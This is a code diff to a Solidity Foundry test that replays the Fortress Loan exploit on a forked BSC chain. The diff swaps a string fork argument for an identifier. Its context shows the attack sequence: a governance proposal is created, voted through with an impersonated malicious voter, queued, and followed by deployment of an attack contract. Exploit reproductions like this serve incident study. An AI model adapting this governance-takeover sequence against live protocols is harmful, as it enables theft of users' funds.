@@ -263,7 +263,7 @@ contract Hacker is DSTest {
     address USDT = 0x55d398326f99059fF775485246999027B3197955;
 
     constructor() {
-        cheat.createSelectFork("bsc", 17_490_837); // Fork BSC mainnet at block 17490837
+        cheat.createSelectFork(bsc, 17_490_837); // Fork BSC mainnet at block 17490837
         emit log_string("This reproduce shows how attacker exploit Fortress Loan, cause ~3,000,000 US$ lost");
         emit log_named_decimal_uint("[Start] Attacker Wallet USDT Balance", IERC20(USDT).balanceOf(address(this)), 18);
         cheat.label(attacker, "AttackerWallet");
@@ -297,7 +297,7 @@ contract Hacker is DSTest {
 
         // txId : 0x12bea43496f35e7d92fb91bf2807b1c95fcc6fedb062d66678c0b5cfe07cc002
         // Do : Create Proposal Id 11
-        cheat.createSelectFork("bsc", 17_490_882);
+        cheat.createSelectFork(bsc, 17_490_882);
         cheat.startPrank(attacker);
         PCreater.ProposalCreated();
         cheat.stopPrank();
@@ -305,7 +305,7 @@ contract Hacker is DSTest {
 
         // txId : 0x83a4f8f52b8f9e6ff1dd76546a772475824d9aa5b953808dbc34d1f39250f29d
         // Do : Vote Proposal Id 11
-        cheat.createSelectFork("bsc", 17_570_125);
+        cheat.createSelectFork(bsc, 17_570_125);
         cheat.startPrank(0x58f96A6D9ECF0a7c3ACaD2f4581f7c4e42074e70); // Malicious voter
         IGovernorAlpha(GovernorAlpha).castVote(11, true);
         cheat.stopPrank();
@@ -313,7 +313,7 @@ contract Hacker is DSTest {
 
         // txId : 0xc368afb2afc499e7ebb575ba3e717497385ef962b1f1922561bcb13f85336252
         // Do : Vote Proposal Id 11
-        cheat.createSelectFork("bsc", 17_570_164);
+        cheat.createSelectFork(bsc, 17_570_164);
         cheat.startPrank(attacker);
         PCreater.castVote();
         cheat.stopPrank();
@@ -321,7 +321,7 @@ contract Hacker is DSTest {
 
         // txId : 0x647c6e89cd1239381dd49a43ca2f29a9fdeb6401d4e268aff1c18b86a7e932a0
         // Do : Queue Proposal Id 11
-        cheat.createSelectFork("bsc", 17_577_532);
+        cheat.createSelectFork(bsc, 17_577_532);
         cheat.startPrank(attacker);
         IGovernorAlpha(GovernorAlpha).queue(11);
         cheat.stopPrank();
@@ -329,7 +329,7 @@ contract Hacker is DSTest {
 
         // txId : 0x4800928c95db2fc877f8ba3e5a41e208231dc97812b0174e75e26cca38af5039
         // Do : Create Attack Contract
-        cheat.createSelectFork("bsc", 17_634_589);
+        cheat.createSelectFork(bsc, 17_634_589);
         cheat.setNonce(attacker, 69);
         cheat.startPrank(attacker);
         Attack attackContract = new Attack();
